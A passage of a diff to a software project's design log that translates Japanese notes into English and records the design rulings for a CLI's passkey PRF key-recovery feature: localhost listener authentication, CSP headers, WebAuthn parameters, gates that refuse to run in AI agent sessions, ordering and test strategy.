-- 残: K5 の passkey 部分 → `/docs/recover-your-key` へ passkey 経路を追記。**K0 の順序は 2026-09-12 所有者裁定で組み替え**: 実機でしか確かめられない部分(ブラウザ × 認証器の PRF 対応表、Codespaces / WSL のポート転送)は K5 の後ろへ回し、まとめて実施する。K5 は環境内で可能な範囲の K0(Bun の 127.0.0.1 リスナー + ワンタイムトークン + Origin 検査、Chromium の仮想認証器での rpId=localhost + PRF の往復)を先行させ、結果を `docs/notes/spike-prf.md` に「仮想認証器で検証済み / 実機は未検証」と区別して残す。公開 docs の passkey 節は実機検証まで保留(「検証していないことを書かない」)。ワイヤ形(rpId=localhost / prf_salt / AAD)は承認済み仕様で固定されており、実機の結果で変わるのは対応表の文面と Codespaces の案内だけ。K5 は別セッションで着手する
+**K6 (docs — for the implemented paths)**: new page `/docs/recover-your-key` (3 paths: recovery code / device handoff / guardian. Limits and gates stated. Passkey not written — unimplemented); `/docs/linux-keychain` rewrites the Codespaces / dev container procedure with handoff on top (`maruhi agent -- bash` → `login` → `key recover --handoff` → `key approve` at hand) + a `--key-ttl` section; an inbound link from getting-started step 4. ROADMAP KL row updated. `bun run check` passes (121 files / 2982 tests).
+- Remaining: K5's passkey part → add the passkey path to `/docs/recover-your-key`. **K0's ordering was rearranged by owner ruling on 2026-09-12**: the parts only verifiable on real hardware (browser × authenticator PRF support table, Codespaces / WSL port forwarding) are moved after K5 and done in one batch. K5 first runs the in-environment-possible part of K0 (Bun's 127.0.0.1 listener + one-time token + Origin check, an rpId=localhost + PRF round trip on Chromium's virtual authenticator), and records the results in `docs/notes/spike-prf.md` distinguishing "verified with a virtual authenticator / unverified on real hardware". The public docs' passkey section is held until real-hardware verification ("don't write what hasn't been verified"). The wire form (rpId=localhost / prf_salt / AAD) is fixed by the approved spec; real-hardware results change only the support-table wording and the Codespaces guidance. K5 is started in a separate session
 
-### 補足 20: K5 パスキー PRF 実装録 — `key seal passkey` / `key recover --passkey`(2026-09-12)
+### Supplement 20: K5 passkey PRF implementation log — `key seal passkey` / `key recover --passkey` (2026-09-12)
 
-KL3 の残件 = K5 のパスキー PRF 部分。対象は (1) CLI が `127.0.0.1` で配る localhost ページ(WebAuthn PRF 拡張を呼び、PRF 出力をループバックの 1 POST で CLI へ渡す — CRYPTO_SPEC §8.2、補足 19-2 裁定 I)、(2) `maruhi key seal passkey`(PRF → KEK → B のラップ → `POST /auth/key-wraps/passkey`)、(3) `maruhi key recover --passkey`(台帳のラップ取得 → 同じパスキーの PRF → 復号 → キーチェーン / agent)。**CLI 初の TCP リスナー**であり、ローカル API の認証(裁定 A)が人間レビュー箇所。
+KL3's remainder = K5's passkey PRF part. Scope: (1) the localhost page the CLI serves on `127.0.0.1` (calls the WebAuthn PRF extension, passes the PRF output to the CLI via one loopback POST — CRYPTO_SPEC §8.2, supplement 19-2 ruling I), (2) `maruhi key seal passkey` (PRF → KEK → wrap of B → `POST /auth/key-wraps/passkey`), (3) `maruhi key recover --passkey` (fetch the ledger wrap → same passkey's PRF → decrypt → keychain / agent). **The CLI's first TCP listener**; the local API's authentication (ruling A) is the human-review point.
 
-前置の K0 は環境内で可能な範囲(Bun のリスナー / Chromium 仮想認証器)を先行し、結果は docs/notes/spike-prf.md(検証済み / 未検証を区別)。実機依存の K0 は所有者が後でまとめて実施し、**公開 docs の passkey 節はそれまで書かない**(20-4 に下書きだけ置く)。
+The preparatory K0 was run ahead within what the environment allows (Bun's listener / Chromium virtual authenticator); results in docs/notes/spike-prf.md (distinguishing verified / unverified). The hardware-dependent part of K0 is done by the owner in a later batch, and **the public docs' passkey section is not written until then** (a draft is placed in 20-4 only).
 
-#### 20-1. 全体像 — 構造とフロー
+#### 20-1. The whole picture — structure and flow
 
 ```
 maruhi key seal passkey [--label <text>]                 maruhi key recover --passkey
-  ゲート(3 チャネル TTY + 非エージェント)                   ゲート(同左)
-  loadMasterKeys(鍵がある端末だけ)                         ensureNoStoredMasterKey(鍵の無い端末だけ)
-  status: passkeys < 5、excludeCredentials 用の id 列       status: passkeys ≥ 1、allowCredentials 用の id 列 + wrapId 対応表
-  wrap_id = ULID、prf_salt = 32 バイト乱数(公開パラメータ)
-  ┌ リスナー 127.0.0.1:0(node:http)── URL http://localhost:<port>/<token>/ を表示 + 自動起動 ┐
-  │   GET  /<token>/            静的 HTML(CSP script-src 'self'、inline なし)              │
-  │   GET  /<token>/app.js      1 スクリプト(WebAuthn 呼び出しと 1 回の fetch だけ)          │
-  │   GET  /<token>/style.css   最小のスタイル                                               │
-  │   GET  /<token>/config.json { mode, rpId, userName, prfSaltHex, credentialIds… }(公開値) │
-  │   POST /<token>/prf         { prfHex, credentialIdHex } | { error: <code> } — 1 回で閉じる │
-  └ Host / Origin 完全一致・トークン不一致・2 回目・本文不正はすべて同一の 404 ───────────────┘
-  KEK = derivePasskeyKek(prf_out)                          credentialId → wrapId、GET /auth/key-wraps/passkey/:wrapId
+  gate (3-channel TTY + non-agent)                        gate (same)
+  loadMasterKeys (only a device holding keys)             ensureNoStoredMasterKey (only a device without keys)
+  status: passkeys < 5, id list for excludeCredentials    status: passkeys ≥ 1, id list for allowCredentials + wrapId mapping
+  wrap_id = ULID, prf_salt = 32 random bytes (public parameter)
+  ┌ listener 127.0.0.1:0 (node:http)── shows URL http://localhost:<port>/<token>/ + auto-opens ┐
+  │   GET  /<token>/            static HTML (CSP script-src 'self', no inline)                 │
+  │   GET  /<token>/app.js      1 script (only the WebAuthn call and one fetch)                │
+  │   GET  /<token>/style.css   minimal styling                                                │
+  │   GET  /<token>/config.json { mode, rpId, userName, prfSaltHex, credentialIds… } (public)  │
+  │   POST /<token>/prf         { prfHex, credentialIdHex } | { error: <code> } — closes after 1│
+  └ Host / Origin exact match, token mismatch, 2nd request, malformed body → same 404 ────────┘
+  KEK = derivePasskeyKek(prf_out)                          credentialId → wrapId, GET /auth/key-wraps/passkey/:wrapId
   wrapMasterBlob(B, AAD = master-wrap, passkey-prf, wrap_id) KEK = derivePasskeyKek(prf_out) → unwrapMasterBlob
-  POST /auth/key-wraps/passkey(登録は最後 — 半端な行を残さない) importMasterKeys(自己検証)→ storeMasterKeyAndReport
-                                                           (Keychain サービス経由 = agent の中なら agent のメモリへ)
-併せて: maruhi key seal list(台帳の passkey 行)/ maruhi key seal remove <wrap-id>(DELETE)
+  POST /auth/key-wraps/passkey (registration is last — no partial rows) importMasterKeys (self-verifies) → storeMasterKeyAndReport
+                                                           (via the Keychain service = into the agent's memory if inside agent)
+Alongside: maruhi key seal list (ledger's passkey rows) / maruhi key seal remove <wrap-id> (DELETE)
 ```
 
-ページは CLI バイナリに**文字列定数として同梱**(裁定 C)。値・鍵素材は DOM に出さず、ページから CLI へ渡るのは PRF 出力(hex)と credential id だけ。PRF 出力は CLI 側で関数ローカルにだけ存在し、KEK 導出後に参照を捨てる(JS の文字列はゼロ化できないので「参照を持たない」が上限 — agent.ts と同じ注記)。
+The page is **bundled as string constants** in the CLI binary (ruling C). No values or key material appear in the DOM; only the PRF output (hex) and the credential id cross from the page to the CLI. The PRF output exists only function-locally on the CLI side and its reference is dropped after KEK derivation (since JS strings can't be zeroed, "holding no reference" is the ceiling — same caveat as agent.ts).
 
-#### 20-2. 裁定の反復記録
+#### 20-2. Iterated rulings record
 
-各裁定点で「3 案以上 → 上位互換 / 銀の弾丸の探索 → 新案が出なくなるまで」を回した。巡数は新案が出た回数(+ 最終確認 1 巡)。
+At each ruling point we ran "3+ options → superset / silver-bullet search → until no new options emerge". The round count is the number of rounds that produced a new option (+ 1 final confirmation round).
 
-| 裁定点 | 巡数 | 検討した案と評価 | 結論 |
+| Ruling point | Rounds | Options considered and evaluation | Conclusion |
 |---|---|---|---|
-| **A. ローカル API の認証**(トークンの運び方・検査・消費・失敗応答) | 3 | ① **URL パス** `/<token>/…`(採用): CLI → ブラウザへ秘密を渡せる唯一の経路が URL であり、パスに置くと**ページ資産の GET も POST も同じトークンで閉じる**(他の localhost ページはこちらの画面を列挙すらできない)。② クエリ `?t=`: ① と同じ性質だがログ・履歴で目立つ形。③ フラグメント `#t=`: 履歴・Referer に残らない利点はあるが**サーバーに届かない**ので GET を閉じられず、ページ JS がヘッダで運ぶ = ページ自体は無認証で配ることになる(認証の面が 1 つ減る)。④ ヘッダのみ: ③ と同じ(フラグメント経由でしか渡せない)。上位互換の探索: ① + `Referrer-Policy: no-referrer`(Referer 漏れを閉じる。ページに外部リンクは無い)+ 履歴に残る URL は**儀式の終わりにリスナーごと消える 1 回限りの値**なので無害 — ③ の利点を ① で回収できる。銀の弾丸(トークン不要にする案): Origin 検査だけで足りるか → 足りない(別ポートの localhost ページは Origin が違うので弾けるが、**トークンが無いとページの存在を誰でも開ける** = 儀式の誘発面が残る)。加えて **`Host` 完全一致**(DNS リバインディング — 攻撃者ドメインを 127.0.0.1 へ解決させても Host が違う)、**`Origin` 完全一致**(`http://localhost:<port>` — ポート込み。JSON の POST は preflight になるので OPTIONS も 404 で落ちる)、**1 回限りの消費**(最初の正しい POST でリスナーを閉じる。2 回目は 404 か接続拒否 — スパイク検証)、**有効期間 = リスナーの寿命 5 分**(ブラウザ起動と生体認証に十分・放置端末で聞き続けない。Ctrl+C で即終了)、**失敗は理由を出さない一様 404**(トークンの存在・形式・Origin の何が違うかを外へ返さない)、本文 ≤ 4 KiB・`application/json` のみ。`Sec-Fetch-Site: same-origin` の追加検査は**採らない**(ブラウザ依存の二重検査で、Origin 完全一致に対して足すものが無い)。トークン = 32 バイト乱数の base64url(43 文字) | ① + Host / Origin 完全一致 + 1 回消費 + 5 分 + 一様 404。**人間レビュー箇所** |
-| **B. リスナーの実装** | 2 | ① **`node:http`**(採用): `agent.ts` の unix ソケットが `node:net` で書かれ「vitest(Node)で実ソケットを検査できる」ことを先例にしている。テストの `MockServer` も `node:http`。② `Bun.serve`: Bun 固有 API は `live.ts` にだけ置く規律(ADR-0016 追記)に反し、vitest(Node)から実リスナーを検査できない。③ `node:net` + 自前 HTTP 解析: パーサの発明(不採用)。④ Effect の `HttpServer`(`@effect/platform-bun` の `BunHttpServer`): Effect 的には最も整うが live は Bun 限定で、テストには `@effect/platform-node` の追加依存が要る(新規依存を足さない方針に反する)。上位互換: ① を `Effect.acquireUseRelease` で資源化(`agent.ts` と同型 — 停止時に開いている接続を `destroy` してから `close`)。bind は `127.0.0.1` のみ(rpId=localhost のため URL は `localhost`。::1 のみに解決する環境は未検証 — spike-prf.md §3。**退避案**: 実機 K0 で繋がらなければ `::1` にも同ポートで best-effort bind する) | ① + acquireUseRelease |
-| **C. ページの配布形**(同梱・CSP・スクリプト分離) | 3 | ① **TS の文字列定数**(`apps/cli/src/passkey-page.ts` がテンプレートリテラルで HTML / JS / CSS を export。採用): `bun build --target=bun` / `--compile` / vitest / tsc のどれにも追加設定が要らない。② Bun の `import … with { type: "text" }`: 3 経路(run / bundle / compile)で同梱されることをスパイクで確認したが、**vitest(Vite)が `.html` の import を変換できず、`bun-types` が `*.html` を `HTMLBundle` 型に取る**ため、Vite プラグインと型の上書きの 2 つのインフラが要る(不採用)。③ バイナリの隣にファイルを置く: 単一バイナリ配布(ADR-0015)を壊す。④ ビルド時にアセットから TS を生成(codegen + 漂流検知): ② の欠点を消せるがインフラが増える(① で足りる)。銀の弾丸: ページを持たない → 不可(PRF はブラウザでしか取れない — 補足 19-2 裁定 I)。**CSP**: `default-src 'none'; script-src 'self'; style-src 'self'; connect-src 'self'; img-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'` を HTML 応答のヘッダで付け、`Referrer-Policy: no-referrer` / `X-Content-Type-Options: nosniff` / `Cache-Control: no-store` を全応答に付ける。**inline script・inline style・eval・第三者スクリプト / CDN・アナリティクスは無い**(テストが HTML を機械検査: `<script` は `src="./app.js"` の 1 つだけ、`on*=` 属性・`javascript:`・`<style` 無し)。① の欠点(HTML / JS が TS 文字列の中で oxlint に掛からない)は、ページ JS が「WebAuthn 2 呼び出し + fetch 1 回」の 60 行程度に留まることと、上記の機械検査で受ける | ① |
-| **D. ブラウザ起動と案内** | 2 | ① **自動起動 + URL 表示 + 失敗時の案内**(採用。login のブラウザ脚と同じ 1 本の縮退経路: 表示は常に行い、`io.openBrowser` の成否で「開いた / 開けなかった」の 1 行を stderr に足す)。② 表示のみ: 手作業が増える。③ 自動起動のみ: 開けない環境(SSH / headless)で行き止まり。上位互換: ① + **リモート端末向けの汎用 1 行**(「この端末がリモート〔SSH / Codespaces / dev container〕なら、ポート <port> を手元へ転送してから URL を開く」)。Codespaces 固有の手順(`gh codespace ports forward` 等)は**実機未検証なので書かない**(実機 K0 後に文面を確定 — 公開 docs と同じ線) | ① + 汎用 1 行 |
-| **E. コマンド面** | 3 | ① `key seal passkey` + `key recover --passkey` のみ。② ① + `--label`(台帳の `label` — 最大 5 件を見分ける表示名。省略可)。③ ② + **`key seal list` / `key seal remove <wrap-id>`**(採用): 受理ポリシー passkey ≤ 5 / user と「再登録 = 新 KEK → 旧ラップの削除」の意味論(CRYPTO_SPEC §8.2)を CLI から完結させるには削除が要る(無いと 5 件で詰まり、失った認証器の行も消せない)。一覧は `status.passkeys`(wrapId / label / credentialId 先頭 / 更新時刻)をそのまま表示し、削除は `DELETE /auth/key-wraps/passkey/:wrapId`(K3 実装済み。サーバー変更なし)。`key show` への統合(④)は「鍵の表示」と「台帳の管理」を混ぜるので不採用。`--label` の既定は**無し**(hostname は同期パスキーの識別に向かない)。`label` の受理規律は api-schema の `PasskeyLabelSchema`(1..64 文字・制御 / bidi 禁止)を宣言側(`Flag.withSchema`)で使い、サーバー往復前に usage エラーにする。ヘルプの `key` 群は generate / show / recover / recovery / approve / seal | ③ |
-| **F. 復元時の credential 選択** | 2 | ① **`status.passkeys` の全 credentialId を `allowCredentials` に渡し、応答の `rawId` で wrapId を選ぶ**(採用): 利用者は選ばなくてよく(認証器 / パスキーマネージャが持つものだけが候補になる)、台帳の行と 1:1 に対応づく。② `--wrap-id` で先に選ぶ: 利用者が ULID を知っている前提が不自然(将来 ① の上に足せる — 今回は付けない)。③ `allowCredentials` 空(発見可能資格情報だけ): resident key を要求することになり roaming 認証器で成立しない場合がある。該当なし: `status.passkeys` が空なら**ブラウザを開く前に**拒否(「登録が無い — 鍵のある端末で `maruhi key seal passkey`」)。応答の `rawId` が台帳のどの行にも無ければ中止(allowCredentials を渡す以上起きないが fail-closed)。認証器側の該当なし・取消は `NotAllowedError` として `error: "not-allowed"` が POST され、CLI が英語の案内に写す | ① |
-| **G. WebAuthn の作成 / 取得パラメータ** | 3 | rp = `{ id: "localhost", name: "maruhi" }`。**`user.id` = 登録ごとの 16 バイト乱数**(決定的な値〔user_id 由来〕にすると、同期パスキーマネージャが同じ rp + user.id の既存パスキーを**置換**し、CLI の知らないところで旧ラップが復元不能になる。乱数なら既存を壊さない)。**`excludeCredentials` = 台帳の全 credentialId**(同じ認証器で 2 つ目を作らせない → `InvalidStateError` を `error: "already-registered"` として「先に `key seal remove`」を案内)。`user.name` = `user.displayName` = `maruhi · <server host>`(裁定 I)。`pubKeyCredParams` = ES256(-7)/ RS256(-257)/ Ed25519(-8)(署名は使わないが必須項目)、`attestation: "none"`、`challenge` = 32 バイト乱数(ページ内で生成 — 検証しない)。`residentKey: "preferred"`(required は容量の無い roaming 認証器で失敗し、discouraged は同期マネージャで意味を持たない)。**`userVerification: "required"`**(スパイクで確定: UV 無し認証器は `preferred` だと PRF が黙って欠け、`required` なら登録時点で明示失敗する。「生体認証 1 回」の設計意図とも一致)。**PRF は `get` から取る**: 登録 = `create`(`prf.eval` を渡し `enabled` を見る)→ `get`(同 salt で `results.first`)の 2 回。`create` 時の `results.first` は Chromium では返るが対応の広さが未検証で、**登録時に復元と同じ経路(`get`)で値を得る**ことで「登録できたが復元で違う値」を構造的に排除する(登録の生体認証が 1 回増える代償)。PRF は `eval.first = prf_salt` のみ(`second` 不使用)。`enabled` が false / `results.first` 無し → `error: "prf-unsupported"` | 上記 |
-| **H. ゲート** | 2 | ① **`ensureSensitiveTerminalAllowed`**(stdin / stdout / stderr が端末 + 既知エージェント検出 — ADR-0016 決定 7。handoff / recovery-code と同じ)を登録・復元・削除に適用(採用。一覧は台帳の公開情報のみなので掛けない)。② 値表示ゲート(`ensureValueDisplayAllowed` = 2 チャネル): 儀式系は 3 チャネルが先例。③ ゲート無し(URL しか出ない): リスナーは儀式そのものであり、エージェント環境で開くと復元鍵がエージェントのセッションに着地する(handoff の要求側と同じ理由で拒否)。**リスナーはゲートの後でしか立たない**。復元は `ensureNoStoredMasterKey`(既存鍵の上書き事故を拒否 — handoff と同文言)。`maruhi agent` の中では `Keychain` サービスが agent を指すので、復元の着地先は自動的に agent のメモリ(handoff と同じ・特別扱い無し) | ① |
-| **I. タイムアウト・後始末・順序** | 2 | 順序(登録): ゲート → 鍵の読込 → status(上限 5 と excludeCredentials)→ wrap_id / prf_salt 生成 → **リスナー起動 → 待機(≤ 5 分)→ 停止** → KEK → ラップ → **最後に POST 登録**。台帳への書き込みは全材料が揃った後の 1 回だけなので、途中失敗で半端な行は残らない(POST 自体の失敗はサーバーが strict 受理で丸ごと拒む)。順序(復元): ゲート → 鍵なし確認 → status → リスナー → 待機 → 停止 → credential → wrapId → **ブロブ取得は PRF の後**(取り消した儀式が合算窓 5 回 / 時を消費しない)→ KEK → 復号 → 自己検証 → 保存。リスナーは `acquireUseRelease` で必ず閉じ、トークンはリスナーと同寿命(閉じたら破棄)。タイムアウトは `Effect.timeout`(5 分)で待機側に掛け、リスナーの release が接続を切る。代替 ②「先にブロブを取ってから儀式」: 窓を無駄に消費する。③「登録を先に POST してから PRF」: PRF 失敗で復元不能な行が残る(不採用) | 上記 |
-| **J. テスト戦略** | 2 | ① **ブラウザ往復はスパイクに留め、CLI テストは「テストがブラウザの代わりに POST する」**(採用): `TestEnv` に `setBrowserOpenHandler(url => Promise<boolean>)` を足し、`openBrowser` が呼ばれた URL へテストが `fetch` で POST する(`setSessionHandler` と同型)。往復は実 crypto + `MockServer`。② vitest に Playwright + 仮想認証器を組み込む: CLI に Playwright(と Chromium)の依存が増え、CI のコストも増える(不採用 — スパイクで往復は確認済み)。③ リスナーだけ単体で検査 + 往復は手動: 往復の退行を検出できない。検査項目: リスナーの認証(トークン不一致 / Host 不一致 / Origin 不一致 / 2 回目の POST / 本文不正 / 上限超過 / タイムアウト)、ゲート(非端末・エージェント)、登録と復元の roundtrip(登録で POST された wrap を復元で返し、テストベクターと同じ `derivePasskeyKek` 経路で復号できる)、既存鍵ありの復元拒否、登録が無いときの拒否、5 件上限、`already-registered` / `not-allowed` / `prf-unsupported` の写像、`seal list` / `seal remove`、HTML の機械検査(裁定 C)、ヘルプ golden、文言規約 | ① |
+| **A. Local API auth** (how the token is carried / checked / consumed / failure responses) | 3 | ① **URL path** `/<token>/…` (adopted): the only channel that can carry a secret CLI → browser is the URL, and placing it in the path **closes both page-asset GETs and the POST under the same token** (other localhost pages can't even enumerate this screen). ② Query `?t=`: same properties as ① but more conspicuous in logs / history. ③ Fragment `#t=`: has the merit of staying out of history / Referer, but **never reaches the server**, so GETs can't be closed — page JS would have to carry it in a header = the page itself is served unauthenticated (one less authentication surface). ④ Headers only: same as ③ (can only be passed via the fragment). Superset search: ① + `Referrer-Policy: no-referrer` (closes Referer leaks; the page has no external links) + the URL remaining in history is a **one-time value that disappears with the listener at the ceremony's end**, so harmless — ③'s merit is recovered within ①. Silver bullet (a way to need no token): is the Origin check alone enough → not enough (a localhost page on another port differs in Origin so it gets rejected, but **without a token anyone can open the page's existence** = the ceremony-induction surface remains). Additionally **exact `Host` match** (DNS rebinding — even if an attacker domain resolves to 127.0.0.1, the Host differs), **exact `Origin` match** (`http://localhost:<port>` — including the port. A JSON POST triggers preflight, so OPTIONS also falls to 404), **one-time consumption** (the first correct POST closes the listener; a second gets 404 or connection refused — spike-verified), **lifetime = the listener's 5-minute lifespan** (enough for browser launch + biometrics; doesn't keep listening on an unattended device. Ctrl+C ends it immediately), **failures return a reason-free uniform 404** (don't reveal whether the token, its format, or the Origin was wrong), body ≤ 4 KiB, `application/json` only. The additional `Sec-Fetch-Site: same-origin` check is **not adopted** (a browser-dependent double check that adds nothing over the exact Origin match). Token = 32 random bytes in base64url (43 chars) | ① + Host / Origin exact match + one-time consumption + 5 min + uniform 404. **Human-review point** |
+| **B. Listener implementation** | 2 | ① **`node:http`** (adopted): `agent.ts`'s unix socket is written on `node:net`, the precedent being "real sockets can be tested under vitest (Node)". The test `MockServer` is also `node:http`. ② `Bun.serve`: Bun-specific APIs live only in `live.ts` per discipline (ADR-0016 addendum), and a real listener can't be tested from vitest (Node). ③ `node:net` + hand-rolled HTTP parsing: inventing a parser (rejected). ④ Effect's `HttpServer` (`@effect/platform-bun`'s `BunHttpServer`): the cleanest Effect-wise, but live is Bun-only and tests would need an added `@effect/platform-node` dependency (against the no-new-dependency policy). Superset: ① as a resource via `Effect.acquireUseRelease` (same shape as `agent.ts` — on stop, `destroy` open connections then `close`). Bind only to `127.0.0.1` (URL uses `localhost` for rpId=localhost. Environments resolving only to ::1 are unverified — spike-prf.md §3. **Fallback**: if real-machine K0 can't connect, best-effort bind `::1` on the same port too) | ① + acquireUseRelease |
+| **C. How the page is distributed** (bundling, CSP, script separation) | 3 | ① **TS string constants** (`apps/cli/src/passkey-page.ts` exports HTML / JS / CSS as template literals. Adopted): no added config needed for `bun build --target=bun` / `--compile` / vitest / tsc. ② Bun's `import … with { type: "text" }`: spike-confirmed it's bundled on all 3 paths (run / bundle / compile), but **vitest (Vite) can't transform the `.html` import and `bun-types` types `*.html` as `HTMLBundle`**, needing two pieces of infrastructure — a Vite plugin and a type override (rejected). ③ Files beside the binary: breaks single-binary distribution (ADR-0015). ④ Generate TS from assets at build time (codegen + drift detection): removes ②'s drawbacks but adds infrastructure (① suffices). Silver bullet: have no page → impossible (PRF can only be obtained in a browser — supplement 19-2 ruling I). **CSP**: attach `default-src 'none'; script-src 'self'; style-src 'self'; connect-src 'self'; img-src 'none'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'` on the HTML response header, and `Referrer-Policy: no-referrer` / `X-Content-Type-Options: nosniff` / `Cache-Control: no-store` on all responses. **No inline script, inline style, eval, third-party script / CDN / analytics** (a test mechanically inspects the HTML: the only `<script` is `src="./app.js"`; no `on*=` attributes, no `javascript:`, no `<style`). ①'s drawback (HTML / JS inside TS strings escapes oxlint) is covered by the page JS staying ~60 lines ("2 WebAuthn calls + 1 fetch") plus the mechanical inspection above | ① |
+| **D. Browser launch and guidance** | 2 | ① **Auto-open + show the URL + guidance on failure** (adopted — the same single degraded path as login's browser leg: always show the URL, and on `io.openBrowser` success/failure add one "opened / couldn't open" line to stderr). ② Show only: more manual work. ③ Auto-open only: dead-ends on environments that can't open (SSH / headless). Superset: ① + **one generic line for remote terminals** ("if this device is remote〔SSH / Codespaces / dev container〕, forward port <port> to your local machine before opening the URL"). Codespaces-specific steps (`gh codespace ports forward` etc.) are **not written since unverified on real hardware** (wording finalized after real-machine K0 — same line as public docs) | ① + the generic line |
+| **E. Command surface** | 3 | ① `key seal passkey` + `key recover --passkey` only. ② ① + `--label` (the ledger's `label` — a display name to tell apart up to 5 entries. Optional). ③ ② + **`key seal list` / `key seal remove <wrap-id>`** (adopted): to complete the acceptance policy passkeys ≤ 5 / user and the semantics "re-register = new KEK → delete the old wrap" (CRYPTO_SPEC §8.2) from the CLI, deletion is needed (without it you get stuck at 5, and a lost authenticator's row can't be removed). List shows `status.passkeys` (wrapId / label / credentialId prefix / updated time) as-is; delete is `DELETE /auth/key-wraps/passkey/:wrapId` (already implemented in K3. No server change). Integration into `key show` (④) was rejected — it mixes "showing a key" with "managing the ledger". `--label` has **no default** (hostname is poorly suited to identifying synced passkeys). `label` acceptance uses api-schema's `PasskeyLabelSchema` (1..64 chars, no control / bidi) on the declaring side (`Flag.withSchema`), failing with a usage error before any server round trip. The `key` group in help is generate / show / recover / recovery / approve / seal | ③ |
+| **F. Credential selection at restore** | 2 | ① **Pass all credentialIds from `status.passkeys` as `allowCredentials`, then pick the wrapId by the response's `rawId`** (adopted): the user doesn't choose (only credentials the authenticator / passkey manager holds become candidates), and it maps 1:1 to ledger rows. ② Choose first with `--wrap-id`: assuming the user knows a ULID is unnatural (can be added on top of ① later — not added now). ③ Empty `allowCredentials` (discoverable credentials only): would require resident keys and may fail on roaming authenticators. Empty case: if `status.passkeys` is empty, refuse **before opening the browser** ("no registration — run `maruhi key seal passkey` on a device holding the key"). If the response's `rawId` matches no ledger row, abort (can't happen given allowCredentials is passed, but fail-closed). Authenticator-side no-match / cancel arrives as `NotAllowedError` → `error: "not-allowed"` is POSTed and the CLI maps it to English guidance | ① |
+| **G. WebAuthn create / get parameters** | 3 | rp = `{ id: "localhost", name: "maruhi" }`. **`user.id` = a per-registration 16-byte random** (a deterministic value〔derived from user_id〕would make a synced passkey manager **replace** the existing passkey under the same rp + user.id, silently leaving the old wrap unrestorable. Random never corrupts the existing one). **`excludeCredentials` = all credentialIds on the ledger** (don't let the same authenticator create a second → map `InvalidStateError` to `error: "already-registered"` guiding "run `key seal remove` first"). `user.name` = `user.displayName` = `maruhi · <server host>` (ruling I). `pubKeyCredParams` = ES256(-7) / RS256(-257) / Ed25519(-8) (signatures unused but it's a required field), `attestation: "none"`, `challenge` = 32 random bytes (generated in-page — never verified). `residentKey: "preferred"` (required fails on roaming authenticators without capacity; discouraged is meaningless on synced managers). **`userVerification: "required"`** (settled by the spike: UV-less authenticators silently omit PRF under `preferred`, while `required` fails explicitly at registration; also matches the "one biometric" design intent). **PRF is taken from `get`**: registration = `create` (pass `prf.eval`, observe `enabled`) → `get` (same salt, `results.first`) = 2 calls. `create`-time `results.first` does return on Chromium but breadth of support is unverified; **obtaining the value at registration via the same path as restore (`get`)** structurally eliminates "registered but restores to a different value" (at the price of one more biometric at registration). PRF uses only `eval.first = prf_salt` (`second` unused). `enabled` false / no `results.first` → `error: "prf-unsupported"` | As above |
+| **H. Gates** | 2 | ① **`ensureSensitiveTerminalAllowed`** (stdin / stdout / stderr are terminals + known-agent detection — ADR-0016 decision 7. Same as handoff / recovery-code) applied to register / restore / delete (adopted. List is not gated — it only reads public ledger info). ② The value-display gate (`ensureValueDisplayAllowed` = 2 channels): ceremonies have the 3-channel precedent. ③ No gate (only a URL is shown): the listener is the ceremony itself; opened in an agent environment, the restored key lands in the agent's session (refused for the same reason as handoff's request side). **The listener only starts after the gate**. Restore also runs `ensureNoStoredMasterKey` (refuse overwriting an existing key — same wording as handoff). Inside `maruhi agent`, the `Keychain` service points at the agent, so the restored key lands in the agent's memory automatically (same as handoff; no special-casing) | ① |
+| **I. Timeout / cleanup / ordering** | 2 | Order (register): gate → load keys → status (cap 5 and excludeCredentials) → generate wrap_id / prf_salt → **start listener → wait (≤ 5 min) → stop** → KEK → wrap → **POST registration last**. The ledger write happens once, after all materials exist, so a mid-failure leaves no partial row (a failing POST is refused whole by the server's strict acceptance). Order (restore): gate → confirm no key → status → listener → wait → stop → credential → wrapId → **blob fetch comes after the PRF** (a cancelled ceremony doesn't consume the combined window of 5/hour) → KEK → decrypt → self-verify → store. The listener always closes via `acquireUseRelease`; the token shares the listener's lifetime (discarded on close). The timeout is applied to the wait side via `Effect.timeout` (5 min); the listener's release severs connections. Alternative ② "fetch the blob before the ceremony": wastes window consumption. ③ "POST the registration before the PRF": a PRF failure leaves an unrestorable row (rejected) | As above |
+| **J. Test strategy** | 2 | ① **Keep the browser round trip in the spike; CLI tests have "the test POST in place of the browser"** (adopted): add `setBrowserOpenHandler(url => Promise<boolean>)` to `TestEnv`; the test `fetch`es a POST to the URL `openBrowser` was called with (same shape as `setSessionHandler`). The round trip runs real crypto + `MockServer`. ② Embed Playwright + a virtual authenticator in vitest: adds Playwright (and Chromium) to the CLI's dependencies and raises CI cost (rejected — the round trip was already confirmed in the spike). ③ Test the listener standalone + round trip manually: can't detect round-trip regressions. Coverage: listener auth (token mismatch / Host mismatch / Origin mismatch / second POST / malformed body / over-limit / timeout), gates (non-terminal, agent), register and restore round trips (the wrap POSTed at registration is returned at restore and decrypts via the same `derivePasskeyKek` path as the test vectors), refusal to restore over an existing key, refusal with no registrations, the 5-item cap, mapping of `already-registered` / `not-allowed` / `prf-unsupported`, `seal list` / `seal remove`, the HTML mechanical inspection (ruling C), help golden, wording conventions | ① |
 
-**仕様・ADR との整合**: 暗号操作は `derivePasskeyKek` / `wrapMasterBlob` / `unwrapMasterBlob`(K2 実装済み)のみで、`packages/crypto` は変更しない。ワイヤ形は AUTH_SPEC §13-9 の `PasskeyWrapRegistration` そのまま(rpId は `"localhost"` 固定)。サーバーは変更なし。ADR-0018 決定 2 の「ワンタイムトークン + Origin 検査」は裁定 A が満たす。ADR-0016 決定 7 のゲートは裁定 H。**仕様改訂を要する裁定は無い**。
+**Consistency with spec / ADRs**: the crypto operations are only `derivePasskeyKek` / `wrapMasterBlob` / `unwrapMasterBlob` (implemented in K2); `packages/crypto` is unchanged. The wire form is AUTH_SPEC §13-9's `PasskeyWrapRegistration` as-is (rpId fixed to `"localhost"`). No server change. ADR-0018 decision 2's "one-time token + Origin check" is satisfied by ruling A. ADR-0016 decision 7's gate is ruling H. **No ruling requires a spec revision**.
 
-#### 20-3. 承認依頼項目(フェーズ A の終わり — 所有者裁定待ち)
+#### 20-3. Items submitted for approval (end of phase A — awaiting owner ruling)
 
-1. 裁定 A: ローカル API の認証 = URL パスのワンタイムトークン + `Host` / `Origin` 完全一致 + 1 回消費 + 5 分 + 一様 404(人間レビュー箇所)
-2. 裁定 B: `node:http` を Effect の資源として使う(bind は `127.0.0.1` のみ。::1 は実機 K0 後の退避案)
